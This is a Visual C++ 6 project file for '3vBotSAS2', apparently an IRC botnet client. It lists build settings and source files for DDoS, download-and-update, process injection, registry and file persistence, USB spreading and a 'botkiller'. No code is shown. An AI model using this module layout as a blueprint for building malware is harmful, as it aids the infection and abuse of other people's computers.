# Microsoft Developer Studio Project File - Name="3vBotSAS2" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=3vBotSAS2 - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "3vBotSAS2.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "3vBotSAS2.mak" CFG="3vBotSAS2 - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "3vBotSAS2 - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "3vBotSAS2 - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "3vBotSAS2 - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "3vBotSAS2___Win32_Release"
# PROP BASE Intermediate_Dir "3vBotSAS2___Win32_Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib libcpmt.lib msvcrt.lib oleaut32.lib comsupp.lib uuid.lib /nologo /subsystem:windows /machine:I386 /nodefaultlib

!ELSEIF  "$(CFG)" == "3vBotSAS2 - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "3vBotSAS2___Win32_Debug"
# PROP BASE Intermediate_Dir "3vBotSAS2___Win32_Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "_DEBUG"
# ADD RSC /l 0x409 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib libcpmt.lib msvcrt.lib oleaut32.lib comsupp.lib uuid.lib /nologo /subsystem:windows /debug /machine:I386 /nodefaultlib /pdbtype:sept

!ENDIF 

# Begin Target

# Name "3vBotSAS2 - Win32 Release"
# Name "3vBotSAS2 - Win32 Debug"
# Begin Group "API"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\API\API.cpp
# End Source File
# Begin Source File

SOURCE=.\API\API.hpp
# End Source File
# End Group
# Begin Group "IRC"

# PROP Default_Filter ""
# Begin Group "commands"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\IRC\commands\botkiller.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\commands.hpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\download.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\server.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\uninstall.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\update.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\uptime.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\commands\visit.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\IRC\IRC.cpp
# End Source File
# Begin Source File

SOURCE=.\IRC\IRC.hpp
# End Source File
# End Group
# Begin Group "Core"

# PROP Default_Filter ""
# Begin Group "Injection"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Core\Injection\inject.cpp
# End Source File
# Begin Source File

SOURCE=.\Core\Injection\thread.cpp
# End Source File
# End Group
# Begin Group "Persistence"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Core\Persistence\file.cpp
# End Source File
# Begin Source File

SOURCE=.\Core\Persistence\registry.cpp
# End Source File
# End Group
# Begin Group "Usage"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Core\Usage\Usage.cpp
# End Source File
# Begin Source File

SOURCE=.\Core\Usage\Usage.hpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Core\core.hpp
# End Source File
# Begin Source File

SOURCE=.\Core\install.cpp
# End Source File
# End Group
# Begin Group "Crypto"

# PROP Default_Filter ""
# Begin Group "MD5"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Crypto\MD5\MD5.cpp
# End Source File
# Begin Source File

SOURCE=.\Crypto\MD5\MD5.hpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Crypto\crypto.hpp
# End Source File
# End Group
# Begin Group "Includes"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Includes\config.hpp
# End Source File
# Begin Source File

SOURCE=.\Includes\includes.hpp
# End Source File
# End Group
# Begin Group "Spreading"

# PROP Default_Filter ""
# Begin Group "USB"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Spreading\USB\usb.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Spreading\spreading.hpp
# End Source File
# End Group
# Begin Group "Resources"

# PROP Default_Filter ""
# End Group
# Begin Source File

SOURCE=.\3vBot.cpp
# End Source File
# Begin Source File

SOURCE=.\res1.bin
# End Source File
# Begin Source File

SOURCE=.\resource.h
# End Source File
# Begin Source File

SOURCE=.\settings.rc
# End Source File
# End Target
# End Project
